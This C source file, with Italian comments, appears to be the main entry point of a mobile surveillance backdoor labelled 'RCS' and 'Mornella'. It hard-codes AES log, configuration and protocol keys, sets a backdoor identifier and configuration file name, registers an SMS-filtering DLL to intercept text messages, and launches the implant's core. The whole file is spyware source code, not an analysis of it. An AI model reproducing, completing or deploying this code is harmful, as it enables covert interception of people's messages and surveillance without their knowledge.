// Mornella Static
#include "Core.h"
#include <stdio.h>

int WINAPI main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
	Core *core;

	// RCS 816 (Test 8)
	/*BYTE LogKey[] = { 0x43, 0xdd, 0xcd, 0xb5, 0x8f, 0x42, 0x21, 0x64, 0x65, 0xe0, 0xba, 0xd6, 0xa0, 0xe9, 0x21, 0x4f };
	BYTE ConfKey[] = { 0x49, 0xd1, 0xe1, 0x53, 0x42, 0x9b, 0xdc, 0x36, 0x1a, 0x0a, 0xa8, 0x42, 0x62, 0x5c, 0x0a, 0xee } ;
	BYTE ProtoKey[] = { 0x57, 0x2e, 0xbc, 0x94, 0x39, 0x12, 0x81, 0xcc, 0xf5, 0x3a, 0x85, 0x13, 0x30, 0xbb, 0x0d, 0x99 };*/

	// RCS 12 (Zeus)
	BYTE LogKey[] = { 0x22, 0x2b, 0x44, 0x5e, 0x10, 0x3d, 0x4c, 0x38, 0x9c, 0x22, 0xc7, 0x00, 0xec, 0x84, 0xea, 0x35 };
	BYTE ConfKey[] = { 0xe7, 0xc2, 0x77, 0x7b, 0x0d, 0x03, 0xd7, 0x91, 0xab, 0x0d, 0x60, 0x1c, 0x26, 0x66, 0x69, 0x67 };
	BYTE ProtoKey[] = { 0x26, 0xcb, 0x94, 0x11, 0x6c, 0x56, 0x9d, 0x45, 0xdc, 0x3f, 0x2f, 0xad, 0x38, 0x75, 0xeb, 0x4d };

	g_hInstance = hInstance;

	// Configurazione artificiale di alcune variabili
	ZeroMemory(g_AesKey, 32);
	ZeroMemory(g_Challenge, 32);
	ZeroMemory(g_ConfKey, 32);

	ZeroMemory(g_BackdoorID, 16);
	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));

	CopyMemory(g_AesKey, LogKey, 16);
	CopyMemory(g_Challenge, ProtoKey, 16);
	CopyMemory(g_ConfKey, ConfKey, 16);
	CopyMemory(g_BackdoorID, "RCS_0000000012", strlen("RCS_0000000xxx"));
	CopyMemory(g_ConfName, L"cptm511.dql", WideLen(L"cptm511.dql"));
	// Fine configurazione artificiale
 
	// Unregistriamo la DLL
	HMODULE hSmsFilter;

	// Installiamo la DLL del filtro SMS
	hSmsFilter = NULL;
	typedef HRESULT (*pRegister)();
	pRegister RegisterFunction;

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		RegisterFunction = (pRegister)GetProcAddress(hSmsFilter, L"DllRegisterServer");

		if (RegisterFunction != NULL) {
			RegisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}
	//

	core = new(std::nothrow) Core();

	if (core == NULL)
		return 0;

	core->Run();

	delete core;

	return 0;
}
